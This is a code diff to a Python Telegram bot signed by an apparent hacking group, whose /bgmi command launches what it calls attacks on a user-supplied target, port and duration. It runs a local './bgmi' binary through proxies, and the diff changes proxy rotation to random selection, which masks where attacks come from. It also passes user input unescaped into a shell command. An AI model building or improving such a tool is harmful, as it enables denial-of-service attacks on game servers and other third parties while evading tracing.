@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 #By Indian Watchdogs @Indian_Hackers_Team
 
+import random
 import telebot
 import subprocess
 import requests
@@ -223,14 +224,13 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME = 0
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     proxies = read_proxies()
-    proxy_index = 0
 
     if user_id in allowed_user_ids:
         if user_id not in admin_id and user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
@@ -251,12 +251,11 @@ def handle_bgmi(message):
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
                 
-                # Use a new proxy for each attack
-                proxy = proxies[proxy_index % len(proxies)]
+                # Select a random proxy for each attack
+                proxy = random.choice(proxies)
                 full_command = f"PROXY={proxy} ./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
 
-                proxy_index += 1  # Move to the next proxy for the next attack
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"
